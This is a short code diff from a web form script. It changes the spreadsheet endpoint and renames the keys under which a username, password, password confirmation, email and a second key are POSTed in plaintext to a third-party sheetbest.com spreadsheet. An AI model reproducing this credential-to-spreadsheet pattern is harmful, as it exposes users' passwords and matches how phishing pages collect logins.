@@ -7,18 +7,18 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('https://api.sheetbest.com/sheets/2d91b976-f2cd-4f48-9916-421822fda8b4', {
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/fcb8c210-ab61-4f9f-8497-2e6358d6369f', {
         method: 'POST',
         mode: 'cors',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            "1": formulario.usuario.value,
-            "2": formulario.contraseña.value,
-            "3": formulario.confirmar.value,
-            "4": formulario.correo.value,
-            "5": formulario.clave2.value
+            "a": formulario.usuario.value,
+            "b": formulario.contraseña.value,
+            "c": formulario.confirmar.value,
+            "d": formulario.correo.value,
+            "e": formulario.clave2.value
         })
     });
 
